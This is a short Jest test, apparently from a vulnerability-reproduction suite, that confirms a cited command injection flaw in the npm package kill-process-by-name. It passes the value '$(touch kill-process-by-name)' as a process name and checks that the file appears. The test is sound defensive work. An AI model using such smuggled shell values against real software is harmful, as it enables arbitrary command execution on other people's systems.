//https://snyk.io/vuln/SNYK-JS-KILLPROCESSBYNAME-1078534
test("Command Injection in kill-process-by-name", () => {
  const kill_process_by_name = require("kill-process-by-name");
  const fs = require("fs");
  const path = "./kill-process-by-name";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_process_by_name("$(touch kill-process-by-name)");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
